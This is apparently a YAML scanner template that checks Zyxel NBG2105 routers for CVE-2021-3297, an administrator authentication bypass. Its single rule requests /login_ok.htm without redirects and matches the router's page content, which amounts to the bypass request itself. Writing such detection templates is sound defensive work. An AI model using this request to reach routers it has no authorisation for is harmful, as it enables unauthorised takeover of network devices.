name: yaml-poc-zyxel-nbg2105_firmware-unauthorized_access-CVE-2021-3297
binding: be608889-e270-4e33-8101-12a6add5e432
detail:
    author: haiqing.chen
    links:
        - https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass
        - https://nvd.nist.gov/vuln/detail/CVE-2021-3297
        - https://www.zyxel.com/support/SupportLandingSR.shtml?c=gb&l=en&kbid=M-01490&md=NBG2105
        - https://www.zyxel.com/us/en/support/security_advisories.shtml
    vulnerability:
        id: b320d43a-5ad8-4b11-8672-3d3b016145b5
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /login_ok.htm
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("ZyXEL NBG2105") && response.body_string.contains('document.cookie="language=zhtw')
expression: r0()
